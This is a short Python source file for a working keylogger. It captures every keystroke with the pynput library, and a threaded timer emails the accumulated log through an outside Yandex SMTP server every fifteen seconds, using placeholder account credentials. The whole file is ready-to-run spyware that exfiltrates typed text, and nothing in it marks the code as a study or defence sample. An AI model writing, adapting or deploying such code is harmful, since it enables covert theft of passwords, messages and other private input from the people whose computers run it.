import pynput.keyboard
import smtplib
import threading

log = ""
def callback_function(key):
    global log
    try:
        #log = log + key.char.encode("utf-8")
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        elif key == key.enter:
            log = log + "\n"
        else:
            log = log + str(key)
    except:
        pass

    print(log)

def send_email(email,password,message):

    email_server = smtplib.SMTP("smtp.yandex.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()


keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

def thread_function():
    global log
    send_email("Your_Mail_Address@yandex.com","applicationPassword_taken_from_yandex_apps",log.encode("utf-8"))
    log = ""
    timer_object = threading.Timer(15,thread_function)
    timer_object.start()

#threading
with keylogger_listener:
    thread_function()
    keylogger_listener.join()